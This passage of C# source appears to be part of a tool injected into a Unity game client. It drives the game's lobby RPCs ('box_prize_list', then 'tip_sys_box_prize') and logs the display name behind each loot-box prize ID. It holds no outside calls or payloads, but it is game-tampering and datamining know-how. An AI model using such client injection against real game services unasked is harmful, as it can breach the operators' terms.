                string paramSig = string.Join(", ", ps.Select(p => p.ParameterType != null ? p.ParameterType.Name : "?").ToArray());
                return $"{typeName}.{m.Name}({paramSig})";
            }
            catch { return m != null ? m.Name : "?"; }
        }

        private static string PrettyDictBlock(string title, Dictionary<string, string> d)
        {
            var sb = new StringBuilder(256);
            sb.Append(title).Append(":\n");
            if (d == null || d.Count == 0)
            {
                sb.Append("  (empty)\n");
                return sb.ToString();
            }

            foreach (var kv in d.OrderBy(k => k.Key, StringComparer.Ordinal))
            {
                sb.Append("  - ").Append(kv.Key).Append(": ").Append(kv.Value ?? "null").Append("\n");
            }
            return sb.ToString();
        }

        private static string IndentBlock(string title, string body)
        {
            var sb = new StringBuilder(body != null ? body.Length + 32 : 32);
            sb.Append(title).Append(":\n");
            if (string.IsNullOrEmpty(body))
            {
                sb.Append("  (empty)");
                return sb.ToString();
            }
            using (var sr = new System.IO.StringReader(body))
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    sb.Append("  ").Append(line).Append("\n");
                }
            }
            return sb.ToString();
        }

        private static string TrimForLog(string s)
        {
            if (s == null) return "null";
            if (s.Length > 12000) return s.Substring(0, 12000) + " ...[cut]";
            return s;
        }

        // ====== 轻量 UI 封装 ======
        private struct KV { public string Key; public string Value; public KV(string k, string v) { Key = k; Value = v; } }

        private static void DrawKvList(List<KV> list)
        {
            if (list == null) return;
            for (int i = 0; i < list.Count; i++)
            {
                GUILayout.BeginHorizontal();
                list[i] = new KV(
                    GUILayout.TextField(list[i].Key ?? "", TextField(), GUILayout.Width(140)),
                    GUILayout.TextField(list[i].Value ?? "", TextField(), GUILayout.ExpandWidth(true))
                );
                if (GUILayout.Button("−", Button(), GUILayout.Width(26))) { list.RemoveAt(i); i--; }
                GUILayout.EndHorizontal();
                GUILayout.Space(4);
            }
            if (list.Count == 0)
            {
                GUILayout.Label("（无参数）", LabelDim());
            }
        }

        private static void UIHeader(string title, Rect area)
        {
            GUI.Box(area, GUIContent.none);
            var s = new GUIStyle(GUI.skin.label) { alignment = TextAnchor.MiddleLeft, fontStyle = FontStyle.Bold };
            GUI.Label(new Rect(area.x + 6, area.y, area.width - 12, 20), title, s);
        }

        private static void DrawBox(Rect r)
        {
            var prev = GUI.color;
            GUI.color = new Color(0, 0, 0, 0.65f);
            GUI.DrawTexture(r, Texture2D.whiteTexture);
            GUI.color = prev;
            GUI.Box(r, GUIContent.none); // 边框
        }

        private static GUIStyle LabelBold()
            => new GUIStyle(GUI.skin.label) { fontStyle = FontStyle.Bold };
        private static GUIStyle LabelDim()
            => new GUIStyle(GUI.skin.label) { normal = { textColor = new Color(1, 1, 1, 0.55f) } };
        private static GUIStyle TextField()
            => new GUIStyle(GUI.skin.textField);
        private static GUIStyle TextArea()
            => new GUIStyle(GUI.skin.textArea) { wordWrap = true };
        private static GUIStyle Button()
            => new GUIStyle(GUI.skin.button);
        private static GUIStyle ButtonPrimary()
        {
            var s = new GUIStyle(GUI.skin.button);
            s.fontStyle = FontStyle.Bold;
            return s;
        }
    }

    public static class RpcScripts
    {
        // 入口：按你给的参数请求第一页 4 条
        public static void FetchBoxPrizeDisplays(string category)
        {
            var app = GameApp.Instance;
            var conn = (app != null) ? app.lobby_connection : null;
            if (conn == null)
            {
                AppendRpcLog("[error] lobby_connection 为空，无法调用");
                return;
            }

            // 1) 先查列表
            var args = new Dictionary<string, string>();
            args["category"] = category;
            args["p"] = "1";
            args["s"] = "1200";
            args["subType"] = "400";
            args["type"] = "3";

            AppendRpcLog("[call] box_prize_list");
            conn.AddTextRpc("box_prize_list",
                new LobbyConnection.RpcCallback(delegate (string data)
                {
                    try
                    {
                        // 2) 解析 prizeId 列表
                        List<string> prizeIds = ParsePrizeIdsFromBoxPrizeList(data);
                        if (prizeIds == null || prizeIds.Count == 0)
                        {
                            AppendRpcLog("[warn] box_prize_list 未解析到任何 prizeId");
                            return;
                        }

                        // 3) 逐个去查 tip_sys_box_prize
                        int idx = 0;
                        Action callNext = null;
                        callNext = delegate
                        {
                            if (idx >= prizeIds.Count)
                            {
                                AppendRpcLog("[ok] 全部 prizeId 已处理完毕");
                                return;
                            }

                            string pid = prizeIds[idx++];
                            var args2 = new Dictionary<string, string>();
                            args2["prizeId"] = pid;

                            conn.AddTextRpc("tip_sys_box_prize",
                                new LobbyConnection.RpcCallback(delegate (string data2)
                                {
                                    try
                                    {
                                        string display = ParseDisplayFromTipSysBoxPrize(data2);
                                        if (display == null) display = string.Empty;

                                        // 4) 输出：prizeId => display
                                        FileLogger.Log("UITools",
                                            string.Format("{0} => {1} => {2}", pid, display, display.valueByThisKey()));
                                    }
                                    catch (Exception ex2)
                                    {
                                        AppendRpcLog("[error] 解析 tip_sys_box_prize 失败: " + ex2);
                                    }
                                    finally
                                    {
                                        // 继续处理下一个
                                        callNext();
                                    }
                                }),
                                args2);
                        };

                        // 启动第一个
                        callNext();
                    }
                    catch (Exception ex)
                    {
                        AppendRpcLog("[error] 解析 box_prize_list 失败: " + ex);
                    }
                }),
                args);
        }

        // --- 解析工具：从 box_prize_list 的回包里抓 prizeId ---
        // 兼容你示例那种文本：prizeId="1476",
        private static List<string> ParsePrizeIdsFromBoxPrizeList(string data)
        {
            var list = new List<string>();
            if (string.IsNullOrEmpty(data)) return list;

            // prizeId="数字"
            var regex = new Regex(@"prizeId\s*=\s*""(\d+)""", RegexOptions.Compiled);
            var m = regex.Matches(data);
            if (m != null && m.Count > 0)
            {
                // 去重（.NET 3.5 下用字典去重）
                var seen = new Dictionary<string, bool>();
                for (int i = 0; i < m.Count; i++)
                {
                    string id = m[i].Groups[1].Value;
                    if (!seen.ContainsKey(id))
                    {
                        seen[id] = true;
                        list.Add(id);
                    }
                }
            }
            return list;
        }

        // --- 解析工具：从 tip_sys_box_prize 的回包里抓 display ---
        // 兼容你示例那种：display = "UI_datalist_Colorful_butterfly"
        private static string ParseDisplayFromTipSysBoxPrize(string data)
        {
            if (string.IsNullOrEmpty(data)) return null;

            var m = Regex.Match(data, @"\bdisplay\s*=\s*""([^""]*)""", RegexOptions.Compiled);
            if (m.Success) return m.Groups[1].Value;

            return null;
        }

        // 你已有的方法，这里只是声明以便示例能独立粘贴
        private static void AppendRpcLog(string msg)
        {
            RpcLabUI.Append(msg);
        }
    }
}
